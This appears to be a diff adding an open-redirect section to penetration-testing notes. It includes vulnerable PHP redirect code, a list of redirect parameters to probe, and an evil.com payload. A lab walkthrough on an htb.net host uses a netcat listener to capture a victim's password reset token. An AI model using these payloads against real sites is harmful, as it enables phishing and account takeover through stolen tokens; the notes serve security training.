@@ -306,3 +306,40 @@ new_password=pwned&CSRF-Token=fixed_token
 - Remove referer header if that is the protection used, add ```<meta name="referrer" content="no-referrer">``` to your page hosting the csrf script
 - Bypass referer regex, if it uses target.com as a whitelist, try using the target domain as follows www.target.com.pwned.m3, www.pwned.m3?www.target.com or www.pwned.m3/www.target.com
 
+### Open Redirect
+
+- Possible when the legitimate application's redirection functionality does not perform any kind of validation
+- Specify a website under their control in a redirection URL of a legitimate website
+- Pass this URL to the victim
+- Example vulnerable redirect code
+```php
+$red = $_GET['url'];
+header("Location: " . $red);
+```
+- Can be manipulated by send ```trusted.site/index.php?url=https://evil.com``` to the victim
+- Other URL parameters to check for:
+  - ?url=
+  - ?link=
+  - ?redirect=
+  - ?redirecturl=
+  - ?redirect_uri=
+  - ?return=
+  - ?return_to=
+  - ?returnurl=
+  - ?go=
+  - ?goto=
+  - ?exit=
+  - ?exitpage=
+  - ?fromurl=
+  - ?fromuri=
+  - ?redirect_to=
+  - ?next=
+  - ?newurl=
+  - ?redir=
+
+  #### Example
+
+  - Navigating to ```http://oredirect.htb.net``` results in ```http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>```
+  - Start a netcat listener
+  - Edit URL to ```http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>``` and send to the victim
+  - Netcat listener will capture the request and the users reset token
